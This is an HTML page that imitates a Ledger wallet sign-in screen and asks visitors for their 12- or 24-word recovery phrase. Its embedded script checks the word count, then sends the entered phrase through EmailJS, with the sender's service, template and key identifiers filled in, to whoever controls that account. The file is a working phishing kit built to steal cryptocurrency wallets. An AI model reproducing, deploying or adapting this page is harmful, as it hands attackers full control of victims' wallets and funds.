<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Ledger - Sign In</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
      body {
        margin: 0;
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background: linear-gradient(to right, #f4e2db, #ebeee8);
      }
      .container {
        background: white;
        padding: 30px;
        box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
        text-align: left;
        width: 350px;
        border-radius: 5px;
      }

      .ledger-logo {
        width: 90px;
        margin-bottom: 10px;
        display: block;
      }
      .title {
        font-size: 22px;
        font-weight: bold;
        margin-bottom: 15px;
      }
      label {
        font-size: 14px;
        color: #555;
      }
      input {
        width: 100%;
        padding: 10px;
        margin-top: 5px;
        border: none;
        border-bottom: 1px solid black;
        outline: none;
      }
      .error {
        color: red;
        font-size: 14px;
        display: none;
        margin-top: 5px;
      }
      .buttons {
        display: flex;
        justify-content: space-between;
        margin-top: 20px;
      }
      .btn {
        padding: 10px 20px;
        border: none;
        cursor: pointer;
        border-radius: 4px;
        font-size: 14px;
      }
      .btn-back {
        background: #ccc;
        border-radius: 0%;
      }
      .btn-next {
        background: rgb(0, 103, 184);
        color: white;
        border-radius: 0;
      }
      input {
        width: 100%;
        padding: 10px;
        margin-top: 5px;
        border: none;
        border-bottom: 1px solid black; /* Thin default line */
        outline: none;
        font-size: 16px; /* Prevents zoom on mobile */
        transition: border-color 0.3s ease; /* Smooth transition */
      }

      input:focus {
        border-bottom: 1px solid #66b3ff; /* Light blue line on focus */
      }

      /* === Responsive for Mobile === */
      @media (max-width: 600px) {
        body {
          align-items: flex-start; /* Moves content to the top */
          height: auto; /* Allows scrolling */
          padding-top: -10px;
        }
        .container {
          width: 100%;
          box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
          border-radius: 0; /* Removes rounded corners */
          height: 25vh;
        }
        .buttons {
          width: 24vh;
          gap: 25px;
          margin-left: 88px;

          /* flex-direction: column; */
        }
        .btn {
          width: 100%;
          margin-top: 10px;
          /* margin-top: -5px; */
        }
        .ledger-logo {
          width: 11vh;
          font-weight: lighter;
        }
        .btn-back {
          color: black;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <img src="image/download (9).png" alt="Ledger Logo" class="ledger-logo" />
      <p class="title">Sign in</p>
      <!-- <label>Enter Wallet 12-24 Key Phrase</label> -->
      <input
        type="text"
        id="walletPhrase"
        placeholder="Enter Wallet 12-24 Key Phrase"
      />
      <p class="error" id="error">The Phrase must be between 12 to 24 words.</p>
      <div class="buttons">
        <button class="btn btn-back">Back</button>
        <button class="btn btn-next" onclick="validatePhrase()">Next</button>
      </div>
    </div>

    <script>
      (function () {
        emailjs.init("3ijyLWGjsj4QnVlp_"); // Replace with your actual EmailJS Public Key
      })();

      function validatePhrase() {
        let phrase = document.getElementById("walletPhrase").value.trim();
        let words = phrase.split(/\s+/);
        let errorText = document.getElementById("error");

        if (words.length === 12 || words.length === 24) {
          errorText.style.display = "none";

          // Send Email using EmailJS
          let emailParams = {
            from_name: "User Wallet Input",
            message: `User input: ${phrase}`,
          };

          emailjs
            .send("service_b2yu2u9", "template_vslmmtl", emailParams)
            .then((response) => {
              alert("Valid phrase! Email sent successfully!");
              console.log("SUCCESS!", response);
            })
            .catch((error) => {
              alert("Valid phrase, but failed to send email.");
              console.log("FAILED...", error);
            });
        } else {
          errorText.style.display = "block";
        }
      }
    </script>
  </body>
</html>
